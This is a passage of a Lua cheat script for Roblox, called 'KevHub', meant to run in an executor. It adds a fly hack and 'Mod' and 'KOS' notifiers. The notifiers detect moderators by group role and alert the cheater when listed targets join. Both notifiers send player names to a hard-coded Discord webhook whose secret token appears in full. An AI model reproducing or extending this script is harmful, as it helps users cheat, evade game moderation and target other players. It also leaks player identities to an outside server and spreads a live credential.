	game.Players.LocalPlayer:Kick("Factory has delivered")
end)

misc:Toggle("Fly [RISKY]", false, function(toggle)
	_G.Fly = toggle

	repeat wait()
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("UpperTorso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
	local mouse = game.Players.LocalPlayer:GetMouse()
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer
	local UpperTorso = plr.Character.UpperTorso
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 50
	local speed = 0

	local function Fly()
		local bg = Instance.new("BodyGyro", UpperTorso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = UpperTorso.CFrame
		local bv = Instance.new("BodyVelocity", UpperTorso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		repeat wait()
			plr.Character.Humanoid.PlatformStand = true
			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0.1,0)
			end
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		until not _G.Fly
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
	end
	mouse.KeyDown:connect(function(key)

		if key:lower() == "w" then
			ctrl.f = 1
		elseif key:lower() == "s" then
			ctrl.b = -1
		elseif key:lower() == "a" then
			ctrl.l = -1
		elseif key:lower() == "d" then
			ctrl.r = 1
		end
	end)
	mouse.KeyUp:connect(function(key)
		if key:lower() == "w" then
			ctrl.f = 0
		elseif key:lower() == "s" then
			ctrl.b = 0
		elseif key:lower() == "a" then
			ctrl.l = 0
		elseif key:lower() == "d" then
			ctrl.r = 0
		end
	end)

	if _G.Fly then
		Fly()
	end
end)

setting:Toggle("Mod Notifier", false, function(h)
	game.Players.PlayerAdded:Connect(function(player)
		if player:GetRoleInGroup(4800422) == "Mod" or player:GetRoleInGroup(4800422) == "MainChar" or player:GetRoleInGroup(4800422) == "sircroc!" or player:GetRoleInGroup(4800422) == "Associates." or player:GetRoleInGroup(4800422) == "Owner" or player.Name == "bIoodstainedforces" then
			local sound = Instance.new("Sound", game.Players.LocalPlayer.Character.HumanoidRootPart)
			sound.Name = "KevHub"
			sound.SoundId = "rbxassetid://8187509078"
			sound.Looped = true 
			sound.Volume = 100
			sound:Play()

			game:GetService("RunService").Stepped:Connect(function()
				if sound.TimePosition < 14.95 then
					sound.TimePosition = 14.95
				end
			end)

			game.StarterGui:SetCore("SendNotification", {Title = "MOD DETECTOR BY KEV"; Text = player.Name.. " joined your server"; Button1 = "Dismiss"; Duration = tonumber(math.huge)})

			local a = syn.request({Url = "https://discord.com/api/webhooks/926638356547375175/oh5le2Um5NTsQSs0t215oPU2Aqi7Y_K9quFIoxkZghv3axuftv9bcRzxZyd3UmK_RPGs"; Method = "POST"; Headers = {['Content-Type'] = 'application/json'}; Body = game:GetService('HttpService'):JSONEncode({['content'] = "<@&921570540022558742>, "..player.Name.." joined: "..game.Players.LocalPlayer.Name.."'s server."})})
		end 
	end)
end)


setting:Seperator()

setting:Textbox("KOS Names", "Username here", true, function(d)
	table.insert(koslist, d)
	writefile("kos_list.json", game:GetService("HttpService"):JSONEncode(koslist))	
	DiscordLib:Notification("KevHub", d.. " added to KOS List", "Okay")
end)

setting:Toggle("KOS Notifier", false, function(w)
	game.Players.PlayerAdded:Connect(function(player)
		if type(table.find(koslist, player.Name)) == "number" then
			local sound = Instance.new("Sound", game.Players.LocalPlayer.Character.HumanoidRootPart)
			sound.Name = "KevHub"
			sound.SoundId = "rbxassetid://8187509078"
			sound.Looped = true 
			sound.Volume = 100
			sound:Play()

			game:GetService("RunService").Stepped:Connect(function()
				if sound.TimePosition < 14.95 then
					sound.TimePosition = 14.95
				end
			end)

			game.StarterGui:SetCore("SendNotification", {Title = "KOS DETECTOR BY KEV"; Text = player.Name.. " joined your server"; Button1 = "Dismiss"; Duration = tonumber(math.huge)})

			local a = syn.request({Url = "https://discord.com/api/webhooks/926638356547375175/oh5le2Um5NTsQSs0t215oPU2Aqi7Y_K9quFIoxkZghv3axuftv9bcRzxZyd3UmK_RPGs"; Method = "POST"; Headers = {['Content-Type'] = 'application/json'}; Body = game:GetService('HttpService'):JSONEncode({['content'] = "<@&921570540022558742>, "..player.Name.." joined: "..game.Players.LocalPlayer.Name.."'s server. [KOS]"})})

		end
	end)
end)

setting:Seperator()

setting:Button("Delete KevHub Sound", function(j)
	if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("KevHub") then
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("KevHub"):Destroy()
	end
end)
